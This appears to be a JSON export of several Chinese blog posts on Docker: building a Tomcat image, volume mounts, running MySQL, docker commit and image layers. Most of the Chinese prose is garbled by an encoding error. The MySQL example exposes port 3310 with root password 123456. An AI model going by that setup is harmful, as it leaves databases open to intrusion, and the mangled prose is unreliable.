05B5 55B3 8483 C65D From : /etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficialKey imported successfullyRunning transaction checkTransaction check succeeded.Running transaction testTransaction test succeeded.Running transaction Preparing : 1/1 Installing : which-2.21-12.el8.x86_64 1/5 Installing : vim-filesystem-2:8.0.1763-15.el8.noarch 2/5 Installing : vim-common-2:8.0.1763-15.el8.x86_64 3/5 Installing : gpm-libs-1.20.7-17.el8.x86_64 4/5 Running scriptlet: gpm-libs-1.20.7-17.el8.x86_64 4/5 Installing : vim-enhanced-2:8.0.1763-15.el8.x86_64 5/5 Running scriptlet: vim-enhanced-2:8.0.1763-15.el8.x86_64 5/5 Running scriptlet: vim-common-2:8.0.1763-15.el8.x86_64 5/5 Verifying : gpm-libs-1.20.7-17.el8.x86_64 1/5 Verifying : vim-common-2:8.0.1763-15.el8.x86_64 2/5 Verifying : vim-enhanced-2:8.0.1763-15.el8.x86_64 3/5 Verifying : vim-filesystem-2:8.0.1763-15.el8.noarch 4/5 Verifying : which-2.21-12.el8.x86_64 5/5Installed: gpm-libs-1.20.7-17.el8.x86_64 vim-common-2:8.0.1763-15.el8.x86_64 vim-enhanced-2:8.0.1763-15.el8.x86_64 vim-filesystem-2:8.0.1763-15.el8.noarch which-2.21-12.el8.x86_64Complete!Removing intermediate container 614daf07d5b9 ---&gt; 05882b638556Step 7/15 : ENV MYPATH /usr/local ---&gt; Running in 6f9ed4aba243Removing intermediate container 6f9ed4aba243 ---&gt; 73f831aacc97Step 8/15 : WORKDIR $MYPATH ---&gt; Running in 061a96c81eabRemoving intermediate container 061a96c81eab ---&gt; 979f862d9edcStep 9/15 : ENV JAVA_HOME /usr/local/jdk-8u301 ---&gt; Running in 4a4f4a989d55Removing intermediate container 4a4f4a989d55 ---&gt; 606ed59a4fa1Step 10/15 : ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar ---&gt; Running in 489c658ba9b4Removing intermediate container 489c658ba9b4 ---&gt; b43e29dd6f13Step 11/15 : ENV CATALINA_HOME /usr/local/apache-tomcat-10.0.10 ---&gt; Running in 55dacf225f4dRemoving intermediate container 55dacf225f4d ---&gt; 8a4dd8f3878bStep 12/15 : ENV CATALINA_BASH /usr/local/apache-tomcat-10.0.10 ---&gt; Running in 896ab8940179Removing intermediate container 896ab8940179 ---&gt; 480c915facd1Step 13/15 : ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin ---&gt; Running in 170db3cfd12aRemoving intermediate container 170db3cfd12a ---&gt; ac5dfb75ad04Step 14/15 : EXPOSE 8080 ---&gt; Running in dd55e8c200aaRemoving intermediate container dd55e8c200aa ---&gt; 953bd5a52b36Step 15/15 : CMD /usr/local/apache-tomcat-10.0.10/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-10.0.10/logs/catalina.out ---&gt; Running in e8f0c4722972Removing intermediate container e8f0c4722972 ---&gt; ec6d3a066471Successfully built ec6d3a066471Successfully tagged diytomcat:latest 4ã€å¯åŠ¨é•œåƒ&emsp;&emsp;docker run -d -p 9090:8080 --name xdddiytomcat -v /home/tomcat/test:/usr/local/apache-tomcat-10.0.10/webapps/test -v /home/tomcat/tomcatlogs/:/usr/local/apache-tomcat-10.0.10/logs diytomcat 5ã€æµ‹è¯•è®¿é—®&emsp;&emsp;æ·»åŠ å…¥ç«™è§„åˆ™ &emsp;&emsp;æµ‹è¯•è®¿é—®ï¼Œä½†æ˜¯å‘ç°å‡ºé”™äº† [root@VM-0-15-centos tomcat]curl localhost:9090curl: (56) Recv failure: connection reset by peer &emsp;&emsp;è¿›å…¥å®¹å™¨æŸ¥çœ‹æ—¥å¿—ï¼Œå‘ç°jdkçš„å¯åŠ¨è·¯å¾„å†™é”™äº†ã€‚å¯¼è‡´å½“æˆ‘å¯åŠ¨tomcatå¯åŠ¨ä¸èµ·æ¥ &emsp;&emsp;é‚£å°±å°†é”™å°±é”™ï¼Œè¿›å…¥å®¹å™¨æŠŠç›®å½•åå­—æ”¹æˆæˆ‘è®¾ç½®çš„é”™çš„åå­—å°±èƒ½æ‰¾åˆ°ç›®å½•äº†ï¼Œè®¾ç½®å¥½åé‡å¯å®¹å™¨ï¼Œå†æ¬¡è®¿é—®å³å¯ [root@VM-0-15-centos tomcat]# docker exec -it 717 /bin/bash[root@717d4ac1437a local]# lsapache-tomcat-10.0.10 bin etc games include jdk1.8.0_301 lib lib64 libexec readme.txt sbin share src[root@717d4ac1437a local]# mv jdk1.8.0_301 jdk-8u301[root@717d4ac1437a local]# exit[root@VM-0-15-centos tomcat]# docker restart 717717[root@VM-0-15-centos tomcat]# curl localhost:9090 &emsp;&emsp;æ³¨æ„ï¼šå› ä¸ºæˆ‘è¿™é‡ŒDockerfileå°±å†™é”™äº†ï¼Œç”Ÿæˆå‡ºæ¥çš„é•œåƒçš„è·¯å¾„è‚¯å®šæ¯æ¬¡ä¹Ÿæ˜¯é”™çš„ï¼Œå› æ­¤æœ€å¥½é‡å†™Dockerfileé‡æ–°ç”Ÿæˆé•œåƒï¼Œé¿å…æ¯æ¬¡éƒ½è¦ä¿®æ”¹è·¯å¾„æ‰èƒ½å¯åŠ¨tomcat 6ã€å‘å¸ƒé¡¹ç›®&emsp;&emsp;ç”±äºåšäº†å·æŒ‚è½½ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨æœ¬åœ°ç¼–å†™é¡¹ç›®å°±å¯ä»¥å‘å¸ƒäº† [root@VM-0-15-centos tomcat]cd /home[root@VM-0-15-centos home]# lsceshi mysql tomcat www[root@VM-0-15-centos home]# cd tomcat[root@VM-0-15-centos tomcat]# lstest tomcatlogs[root@VM-0-15-centos tomcat]# cd test[root@VM-0-15-centos test]# mkdir WEB-INF[root@VM-0-15-centos test]# cd WEB-INF/[root@VM-0-15-centos WEB-INF]# vim web.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot; version=&quot;2.5&quot;&gt;&lt;/web-app&gt;[root@VM-0-15-centos WEB-INF]# cd ..[root@VM-0-15-centos test]# lsWEB-INF[root@VM-0-15-centos test]# vim index.jsp&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Helloï¼Œå°å®å½“&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Hello World!&lt;br/&gt;&lt;%out.println(&quot;ä½ çš„ IP åœ°å€ &quot; + request.getRemoteAddr());System.out.println(&quot;----my test web logs----&quot;);%&gt;&lt;/body&gt;&lt;/html&gt; &emsp;&emsp;è®¿é—®æˆåŠŸhttp://IPåœ°å€:9090/test &emsp;&emsp;æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ï¼Œä¹Ÿèƒ½çœ‹åˆ°å“åº”è®°å½• [root@VM-0-15-centos tomcat]# cd tomcatlogs[root@VM-0-15-centos tomcatlogs]# lscatalina.2021-09-04.log catalina.out localhost.2021-09-04.log localhost_access_log.2021-09-04.txt[root@VM-0-15-centos tomcatlogs]# cat catalina.out","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"å®¹å™¨æ•°æ®å·","slug":"å®¹å™¨æ•°æ®å·","date":"2021-12-13T11:51:54.000Z","updated":"2022-01-03T03:18:14.825Z","comments":true,"path":"post/dbe3c4ee.html","link":"","permalink":"https://wolke.cn/post/dbe3c4ee.html","excerpt":"","text":"ä¸€ã€ä»€ä¹ˆæ˜¯å®¹å™¨æ•°æ®å·dockerçš„ç†å¿µå›é¡¾ æ€»ç»“ä¸€å¥è¯ï¼šå®¹å™¨çš„æŒä¹…åŒ–å’ŒåŒæ­¥æ“ä½œï¼å®¹å™¨é—´ä¹Ÿæ˜¯å¯ä»¥æ•°æ®å…±äº«çš„ äºŒã€ä½¿ç”¨æ•°æ®å·&emsp;&emsp;ç›´æ¥ä½¿ç”¨å‘½ä»¤æ¥æŒ‚è½½ docker run -it -v ä¸»æœºç›®å½•:å®¹å™¨å†…ç›®å½•#æµ‹è¯•[root@VM-0-15-centos ~]# docker run -it -v /home/ceshi:/home centos /bin/bash#å¯åŠ¨èµ·æ¥æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ docker inspect å®¹å™¨id æŸ¥çœ‹æŒ‚è½½æƒ…å†µ[root@VM-0-15-centos ~]# cd /home[root@VM-0-15-centos home]# ls ceshi[root@VM-0-15-centos home]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESaa5de9eebf5e centos &quot;/bin/bash&quot; 2 minutes ago Up 2 minutes zen_bohrd93e31b351d5 portainer/portainer &quot;/portainer&quot; 46 hours ago Up 46 hours 0.0.0.0:8088-&gt;9000/tcp, :::8088-&gt;9000/tcp romantic_kepler64dc6975f6e4 tomcat &quot;catalina.sh run&quot; 47 hours ago Up 47 hours 0.0.0.0:3355-&gt;8080/tcp, :::3355-&gt;8080/tcp tomcat01d0850b4943fc nginx &quot;/docker-entrypoint.â€¦&quot; 2 days ago Up 2 days 0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp nginx01[root@VM-0-15-centos home]# docker inspect aa5d ä¸‰ã€å®æˆ˜ï¼šå®‰è£…MySQL&emsp;&emsp;é€šè¿‡å®˜æ–¹æ–‡æ¡£ï¼Œå¯ä»¥çœ‹åˆ°å®‰è£…å¯åŠ¨MySQLï¼Œéœ€è¦é…ç½®å¯†ç ï¼Œè¿™æ˜¯è¦æ³¨æ„çš„ï¼ #å¯åŠ¨MySQL[root@VM-0-15-centos ~]# docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name=mysql01 mysql863db62d897742e0e62d6c8a4ef9507b00bc1b56071e7768920f645995e4b3f6#-d åå°è¿è¡Œ#-p ç«¯å£æ˜ å°„#-v å·æŒ‚è½½#-e ç¯å¢ƒé…ç½®#--name å®¹å™¨åå­— &emsp;&emsp;æ³¨æ„å®‰å…¨ç»„è®¾ç½®å¯ä»¥è®¿é—®3310ç«¯å£ &emsp;&emsp;ä½¿ç”¨è¿æ¥å·¥å…·ï¼Œå¯ä»¥çœ‹åˆ°è¿æ¥æœåŠ¡å™¨å†…å®¹å™¨çš„mysqlæˆåŠŸ &emsp;&emsp;åœ¨æœ¬åœ°æµ‹è¯•åˆ›å»ºä¸€ä¸ªæ•°æ®åº“ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬çš„æ˜ å°„è·¯å¾„æ˜¯å¦ok ä¸€å¼€å§‹æ˜¯æ²¡æœ‰testæ•°æ®åº“çš„ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªtestæ•°æ®åº“ å†æ¬¡æŸ¥çœ‹ç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°æœ‰testç›®å½• &emsp;&emsp;å³ä½¿æŠŠå®¹å™¨åˆ é™¤ï¼Œå‘ç°æˆ‘ä»¬æŒ‚è½½åˆ°æœ¬åœ°çš„æ•°æ®å·ä¾ç„¶æ²¡æœ‰ä¸¢å¤±ï¼Œè¿™å°±å®ç°äº†å®¹å™¨æ•°æ®æŒä¹…åŒ–åŠŸèƒ½ å››ã€åŒ¿åæŒ‚è½½å’Œå…·åæŒ‚è½½1ã€åŒ¿åæŒ‚è½½&emsp;&emsp;åªæŒ‡å®šå®¹å™¨å†…ï¼ŒæœªæŒ‡å®šå®¹å™¨å¤– &emsp;&emsp;docker run -d -P --name nginx01 -v /etc/nginx nginx -v å®¹å™¨å†…è·¯å¾„ ä¸å»å†™ä¸»æœºä¸Šçš„è·¯å¾„ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªè·¯å¾„ -P å¤§å†™çš„Pï¼ŒéšæœºæŒ‡å®šç«¯å£ &emsp;&emsp;docker volumeå‘½ä»¤ &emsp;&emsp;èƒ½å¤Ÿå‘ç°å·çš„åç§°æ˜¯ä¸€ä¸²å­—ç¬¦ï¼Œè¿™ç§å°±æ˜¯åŒ¿åæŒ‚è½½ &emsp;&emsp;åœ¨ -v çš„æ—¶å€™åªå†™äº†å®¹å™¨å†…çš„è·¯å¾„ï¼Œæ²¡æœ‰å†™å®¹å™¨å¤–çš„è·¯å¾„ 2ã€å…·åæŒ‚è½½&emsp;&emsp;é€šè¿‡ -v å·å:å®¹å™¨å†…è·¯å¾„ æ¥ä¸ºå·å‘½å &emsp;&emsp;docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx nginx &emsp;&emsp;æŸ¥çœ‹å·åå…·ä½“ä½ç½®ï¼šdocker volume inspect juming-nginx &emsp;&emsp;æ‰€æœ‰çš„ docker å®¹å™¨å†…çš„å·ï¼Œæ²¡æœ‰æŒ‡å®šç›®å½•çš„æƒ…å†µä¸‹éƒ½æ˜¯åœ¨ï¼š**/var/lib/docker/volumes/xxxx/_data** &emsp;&emsp;æˆ‘ä»¬é€šè¿‡å…·åæŒ‚è½½å¯ä»¥æ–¹ä¾¿çš„æ‰¾åˆ°æˆ‘ä»¬çš„ä¸€ä¸ªå·ï¼Œå¤§å¤šæ•°æƒ…å†µä¹Ÿæ˜¯åœ¨ä½¿ç”¨å…·åæŒ‚è½½ &emsp;&emsp;é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•ç¡®å®šæ˜¯å…·åæŒ‚è½½è¿˜æ˜¯åŒ¿åæŒ‚è½½ï¼Œäº¦æˆ–æ˜¯æŒ‡å®šè·¯å¾„æŒ‚è½½å‘¢ï¼Ÿ -v å®¹å™¨å†…è·¯å¾„ åŒ¿åæŒ‚è½½ -v å·å:å®¹å™¨å†…è·¯å¾„ å…·åæŒ‚è½½ -v /å®¿ä¸»æœºè·¯å¾„:å®¹å™¨å†…è·¯å¾„ æŒ‡å®šè·¯å¾„æŒ‚è½½ ï¼Œæ³¨æ„æœ‰/ äº”ã€å®¹å™¨æƒé™&emsp;&emsp;æœ‰æ—¶å€™æˆ‘ä»¬ä¼šé‡åˆ°è¿™æ ·çš„ä¸€ä¸ªå‘½ä»¤ï¼Œè·¯å¾„åé¢è·Ÿç€ä¸€ä¸ª ro æˆ– rw docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:ro nginxdocker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:rw nginx &emsp;&emsp;ä¸€æ—¦è®¾ç½®äº†å®¹å™¨çš„æƒé™ï¼Œå®¹å™¨å¯¹æˆ‘ä»¬æŒ‚è½½å‡ºæ¥çš„å†…å®¹å°±æœ‰é™å®šäº† &emsp;&emsp;åªè¦çœ‹åˆ° ro å°±è¯´æ˜è¿™ä¸ªæŒ‚è½½è·¯å¾„åªèƒ½é€šè¿‡å®¿ä¸»æœºæ¥æ“ä½œï¼Œå®¹å™¨å†…éƒ¨æ˜¯æ— æ³•æ“ä½œçš„ï¼Œå®¹å™¨æƒé™é»˜è®¤ä¸º rw ro readonlyï¼Œåªè¯» rw readwriteï¼Œå¯è¯»å¯å†™","categories":[],"tags":[],"author":"w01ke"},{"title":"docker commité•œåƒ","slug":"docker-commité•œåƒ","date":"2021-12-13T11:50:29.000Z","updated":"2022-01-03T03:25:40.463Z","comments":true,"path":"post/1c96de95.html","link":"","permalink":"https://wolke.cn/post/1c96de95.html","excerpt":"","text":"å‘½ä»¤ï¼šdocker commit #æäº¤å®¹å™¨æˆä¸ºä¸€ä¸ªæ–°çš„å‰¯æœ¬ #å‘½ä»¤å’ŒgitåŸç†ç±»ä¼¼docker commit -a=&quot;ä½œè€…&quot; -m=&quot;æäº¤çš„æè¿°ä¿¡æ¯&quot; å®¹å™¨id ç›®æ ‡é•œåƒå[:TAG] å®æˆ˜æµ‹è¯• #å¯åŠ¨ä¸€ä¸ªé»˜è®¤çš„docker#å‘ç°è¿™ä¸ªé»˜è®¤çš„tomcatæ˜¯æ²¡æœ‰webappsåº”ç”¨ï¼Œé•œåƒçš„åŸå› ï¼Œå®˜æ–¹çš„é•œåƒé»˜è®¤webappsä¸‹é¢æ˜¯æ²¡æœ‰æ–‡ä»¶çš„#æˆ‘è‡ªå·±ä»webapps.distæ‹·è´è¿›webappsäº†åŸºæœ¬æ–‡ä»¶#å°†æˆ‘ä»¬æ“ä½œè¿‡çš„å®¹å™¨é€šè¿‡commitæäº¤ä¸ºä¸€ä¸ªé•œåƒï¼æˆ‘ä»¬ä»¥åå°±ä½¿ç”¨æˆ‘ä»¬ä¿®æ”¹è¿‡çš„é•œåƒå³å¯","categories":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/categories/docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://wolke.cn/tags/docker/"}],"author":"w01ke"},{"title":"dockeré•œåƒè®²è§£","slug":"dockeré•œåƒè®²è§£","date":"2021-12-13T11:47:12.000Z","updated":"2022-01-03T03:26:33.894Z","comments":true,"path":"post/9e39f1c0.html","link":"","permalink":"https://wolke.cn/post/9e39f1c0.html","excerpt":"","text":"ä¸€ã€é•œåƒæ˜¯ä»€ä¹ˆ&emsp;&emsp;é•œåƒæ˜¯ä¸€ç§è½»é‡çº§ã€å¯æ‰§è¡Œçš„ç‹¬ç«‹è½¯ä»¶åŒ…ï¼Œç”¨æ¥æ‰“åŒ…è½¯ä»¶è¿è¡Œç¯å¢ƒå’ŒåŸºäºè¿è¡Œç¯å¢ƒå¼€å‘çš„è½¯ä»¶ï¼Œå®ƒåŒ…å«è¿è¡ŒæŸä¸ªè½¯ä»¶æ‰€éœ€çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒ…æ‹¬ä»£ç ã€è¿è¡Œæ—¶ã€åº“ã€ç¯å¢ƒå˜é‡å’Œé…ç½®æ–‡ä»¶ã€‚ &emsp;&emsp;æ‰€æœ‰çš„åº”ç”¨ï¼Œç›´æ¥æ‰“åŒ…dockeré•œåƒï¼Œå°±å¯ä»¥ç›´æ¥è·‘èµ·æ¥ &emsp;&emsp;å¦‚ä½•å¾—åˆ°é•œåƒï¼š ä»è¿œç¨‹ä»“åº“ä¸‹è½½ æœ‹å‹æ‹·è´ç»™ä½  è‡ªå·±åˆ¶ä½œä¸€ä¸ªé•œåƒDockerFile äºŒã€Dockeré•œåƒåŠ è½½åŸç†1ã€UnionFSï¼ˆè”åˆæ–‡ä»¶ç³»ç»Ÿï¼‰&emsp;&emsp;UnionFS (è”åˆæ–‡ä»¶ç³»ç»Ÿ) : Unionæ–‡ä»¶ç³»ç»Ÿ( UnionFS)æ˜¯ä¸€ç§åˆ†å±‚ã€ è½»é‡çº§å¹¶ä¸”é«˜æ€§èƒ½çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒæ”¯æŒå¯¹æ–‡ä»¶ç³»ç»Ÿçš„ä¿®æ”¹ä½œä¸ºä¸€æ¬¡æäº¤æ¥ä¸€å±‚å±‚çš„å åŠ ï¼ŒåŒæ—¶å¯ä»¥å°†ä¸åŒç›®å½•æŒ‚è½½åˆ°åŒä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿä¸‹ï¼ˆunite several directories into a single virtual filesystemï¼‰ã€‚Unionæ–‡ä»¶ç³»ç»Ÿæ˜¯Dockeré•œåƒçš„åŸºç¡€ã€‚é•œåƒå¯ä»¥é€šè¿‡åˆ†å±‚æ¥è¿›è¡Œç»§æ‰¿ï¼ŒåŸºäºåŸºç¡€é•œåƒï¼ˆæ²¡æœ‰çˆ¶é•œåƒï¼‰,å¯ä»¥åˆ¶ä½œå„ç§å…·ä½“çš„åº”ç”¨é•œåƒã€‚ &emsp;&emsp;ç‰¹æ€§ï¼šä¸€æ¬¡åŒæ—¶åŠ è½½å¤šä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä½†ä»å¤–é¢çœ‹èµ·æ¥ï¼Œåªèƒ½çœ‹åˆ°ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œè”åˆåŠ è½½ä¼šæŠŠå„å±‚æ–‡ä»¶ç³»ç»Ÿå åŠ èµ·æ¥ï¼Œè¿™æ ·æœ€ç»ˆçš„æ–‡ä»¶ç³»ç»Ÿä¼šåŒ…å«æ‰€æœ‰åº•å±‚çš„æ–‡ä»¶å’Œç›®å½• &emsp;&emsp;æˆ‘ä»¬ä¸‹è½½é•œåƒçš„æ—¶å€™çœ‹åˆ°çš„ä¸€å±‚å±‚å°±æ˜¯è¿™ä¸ª 2ã€Dockeré•œåƒåŠ è½½åŸç†&emsp;&emsp;Dockerçš„é•œåƒå®é™…ä¸Šç”±ä¸€å±‚ä¸€å±‚çš„æ–‡ä»¶ç³»ç»Ÿç»„æˆï¼Œè¿™ç§å±‚çº§çš„æ–‡ä»¶ç³»ç»ŸUnionFSã€‚ &emsp;&emsp;BootFSï¼ˆBoot File Systemï¼‰ä¸»è¦åŒ…å«bootloaderå’Œkernelï¼Œbootloaderä¸»è¦æ˜¯å¼•|å¯¼åŠ è½½kernelï¼ŒLinuxåˆšå¯åŠ¨æ—¶ä¼šåŠ è½½BootFSæ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨Dockeré•œåƒçš„æœ€åº•å±‚æ˜¯bootfsã€‚è¿™ä¸€å±‚ä¸æˆ‘ä»¬å…¸å‹çš„Linux/Unixç³»ç»Ÿæ˜¯ä¸€æ ·çš„ï¼ŒåŒ…å«bootåŠ è½½å™¨å’Œå†…æ ¸ã€‚å½“bootåŠ è½½å®Œæˆä¹‹åæ•´ä¸ªå†…æ ¸å°±éƒ½åœ¨å†…å­˜ä¸­äº†ï¼Œæ­¤æ—¶å†…å­˜çš„ä½¿ç”¨æƒå·²ç”±BootFSè½¬äº¤ç»™å†…æ ¸ï¼Œæ­¤æ—¶ç³»ç»Ÿä¹Ÿä¼šå¸è½½bootfs. &emsp;&emsp;RootFS (Root File System) ï¼Œåœ¨bootfsä¹‹ä¸Šã€‚åŒ…å«çš„å°±æ˜¯å…¸å‹Linux ç³»ç»Ÿä¸­çš„/devï¼Œ /procï¼Œ /binï¼Œ /etcç­‰æ ‡å‡†ç›®å½•å’Œæ–‡ä»¶ã€‚RootFSå°±æ˜¯å„ç§ä¸åŒçš„æ“ä½œç³»ç»Ÿå‘è¡Œç‰ˆï¼Œæ¯”å¦‚Ubuntuï¼ŒCentosç­‰ç­‰ã€‚ &emsp;&emsp;å¹³æ—¶æˆ‘ä»¬å®‰è£…è¿›è™šæ‹Ÿæœºçš„CentOSéƒ½æ˜¯å¥½å‡ ä¸ªGï¼Œä¸ºä»€ä¹ˆDockerè¿™é‡Œæ‰200Mï¼Ÿ &emsp;&emsp;å¯¹äºä¸€ä¸ªç²¾ç®€çš„OSï¼ŒRootfFSå¯ä»¥å¾ˆå°ï¼Œåªéœ€è¦åŒ…å«æœ€åŸºæœ¬çš„å‘½ä»¤ï¼Œå·¥å…·å’Œç¨‹åºåº“å°±å¯ä»¥äº†ï¼Œå› ä¸ºåº•å±‚ç›´æ¥ç”¨Hostçš„kernelï¼Œè‡ªå·±åªéœ€è¦æä¾›RootFSå°±å¯ä»¥äº†ã€‚ç”±æ­¤å¯è§å¯¹äºä¸åŒçš„linuxå‘è¡Œç‰ˆï¼ŒBootFSåŸºæœ¬æ˜¯ä¸€è‡´çš„ï¼ŒRootFSä¼šæœ‰å·®åˆ«ï¼Œå› æ­¤ä¸åŒçš„å‘è¡Œç‰ˆå¯ä»¥å…¬ç”¨BootFSã€‚ 3ã€åˆ†å±‚ç†è§£ï¼ˆ1ï¼‰åˆ†å±‚çš„é•œåƒ&emsp;&emsp;æˆ‘ä»¬å¯ä»¥å»ä¸‹è½½ä¸€ä¸ªé•œåƒï¼Œæ³¨æ„è§‚å¯Ÿä¸‹è½½çš„æ—¥å¿—è¾“å‡ºï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€å±‚ä¸€å±‚çš„åœ¨ä¸‹è½½ï¼ &emsp;&emsp;æ€è€ƒï¼šä¸ºä»€ä¹ˆDockeré•œåƒè¦é‡‡ç”¨è¿™ç§åˆ†å±‚çš„ç»“æ„å‘¢ï¼Ÿ &emsp;&emsp;æœ€å¤§çš„å¥½å¤„ï¼Œæˆ‘è§‰å¾—è«è¿‡äºæ˜¯èµ„æºå…±äº«äº†ï¼æ¯”å¦‚æœ‰å¤šä¸ªé•œåƒéƒ½ä»ç›¸åŒçš„Baseé•œåƒæ„å»ºè€Œæ¥ï¼Œé‚£ä¹ˆå®¿ä¸»æœºåªéœ€åœ¨ç£ç›˜ä¸Šä¿ç•™ä¸€ä»½baseé•œåƒï¼ŒåŒæ—¶å†…å­˜ä¸­ä¹Ÿåªéœ€è¦åŠ è½½ä¸€ä»½baseé•œåƒï¼Œè¿™æ ·å°±å¯ä»¥ä¸ºæ‰€æœ‰çš„å®¹å™¨æœåŠ¡äº†ï¼Œä¸”é•œåƒçš„æ¯ä¸€å±‚éƒ½å¯ä»¥è¢«å…±äº«ã€‚ &emsp;&emsp;æŸ¥çœ‹é•œåƒåˆ†å±‚çš„æ–¹å¼å¯ä»¥é€šè¿‡docker image inspect é•œåƒåå‘½ä»¤ï¼ ï¼ˆ2ï¼‰ç†è§£&emsp;&emsp;æ‰€æœ‰çš„Dockeré•œåƒéƒ½èµ·å§‹äºä¸€ä¸ªåŸºç¡€é•œåƒå±‚ï¼Œå½“è¿›è¡Œä¿®æ”¹æˆ–å¢åŠ æ–°çš„å†…å®¹æ—¶ï¼Œå°±ä¼šåœ¨å½“å‰é•œåƒå±‚ä¹‹ä¸Šï¼Œåˆ›å»ºæ–°çš„é•œåƒå±‚ã€‚ &emsp;&emsp;ä¸¾ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œå‡å¦‚åŸºäºUbuntu Linux 16.04åˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒï¼Œè¿™å°±æ˜¯æ–°é•œåƒçš„ç¬¬ä¸€å±‚ï¼›å¦‚æœåœ¨è¯¥é•œåƒä¸­æ·»åŠ PythonåŒ…ï¼Œå°±ä¼šåœ¨åŸºç¡€é•œåƒå±‚ä¹‹ä¸Šåˆ›å»ºç¬¬äºŒä¸ªé•œåƒå±‚ï¼›å¦‚æœç»§ç»­æ·»åŠ ä¸€ä¸ªå®‰å…¨è¡¥ä¸ï¼Œå°±ä¼šåˆ›å»ºç¬¬ä¸‰ä¸ªé•œåƒå±‚ã€‚ &emsp;&emsp;è¯¥é•œåƒå½“å‰å·²ç»åŒ…å«3ä¸ªé•œåƒå±‚ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆè¿™åªæ˜¯ä¸€ä¸ªç”¨äºæ¼”ç¤ºçš„å¾ˆç®€å•çš„ä¾‹å­ï¼‰ &emsp;&emsp;åœ¨æ·»åŠ é¢å¤–çš„é•œåƒå±‚çš„åŒæ—¶,é•œåƒå§‹ç»ˆä¿æŒæ˜¯å½“å‰æ‰€æœ‰é•œåƒçš„ç»„åˆï¼Œç†è§£è¿™ä¸€ç‚¹ç‚¹å¸¸é‡è¦ã€‚ å›¾ä¸­ä¸¾äº†ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œæ¯ä¸ªé•œåƒåŒ…å«3ä¸ªæ–‡ä»¶ï¼Œè€Œé•œåƒåŒ…å«äº†æ¥è‡ªä¸¤ä¸ªé•œåƒå±‚çš„6ä¸ªæ–‡ä»¶ã€‚ &emsp;&emsp;ä¸Šå›¾ä¸­çš„é•œåƒå±‚è·Ÿä¹‹å‰å›¾ä¸­çš„ç•¥æœ‰åŒºåˆ«ï¼Œä¸»è¦ç›®çš„æ˜¯ä¾¿äºå±•ç¤ºæ–‡ä»¶ã€‚ä¸‹å›¾ä¸­å±•ç¤ºäº†ä¸€ä¸ªç¨å¾®å¤æ‚çš„ä¸‰å±‚é•œåƒï¼Œåœ¨å¤–éƒ¨çœ‹æ¥æ•´ä¸ªé•œåƒåªæœ‰6ä¸ªæ–‡ä»¶ï¼Œè¿™æ˜¯å› ä¸ºæœ€ä¸Šå±‚ä¸­çš„æ–‡ä»¶7æ˜¯æ–‡ä»¶5çš„ä¸€ä¸ªæ›´æ–°ç‰ˆæœ¬ã€‚ &emsp;&emsp;è¿™ç§æƒ…å†µä¸‹ï¼Œä¸Šå±‚é•œåƒå±‚ä¸­çš„æ–‡ä»¶è¦†ç›–äº†åº•å±‚é•œåƒå±‚ä¸­çš„æ–‡ä»¶ã€‚è¿™æ ·å°±ä½¿å¾—æ–‡ä»¶çš„æ›´æ–°ç‰ˆæœ¬ä½œä¸ºä¸€ä¸ªæ–°é•œåƒå±‚æ·»åŠ åˆ°é•œåƒå½“ä¸­ã€‚ &emsp;&emsp;Dockeré€šè¿‡å­˜å‚¨å¼•æ“ï¼ˆæ–°ç‰ˆæœ¬é‡‡ç”¨å¿«ç…§æœºåˆ¶ï¼‰çš„æ–¹å¼æ¥å®ç°é•œåƒå±‚å †æ ˆ,ï¼Œä¿è¯å¤šé•œåƒå±‚å¯¹å¤–å±•ç¤ºä¸ºç»Ÿä¸€çš„æ–‡ä»¶ç³»ç»Ÿã€‚ 